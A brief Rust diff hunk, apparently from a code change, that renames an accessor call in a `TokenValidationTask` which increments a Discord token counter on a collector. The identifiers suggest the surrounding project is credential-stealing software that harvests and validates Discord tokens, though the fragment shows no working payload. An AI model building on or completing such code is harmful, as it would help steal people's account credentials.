@@ -23,7 +23,7 @@ impl<C: Collector> Task<C> for TokenValidationTask {
             return
         };
 
-        collector.software().increase_discord_tokens();
+        collector.get_software().increase_discord_tokens();
 
         let _ = info
             .to_string()
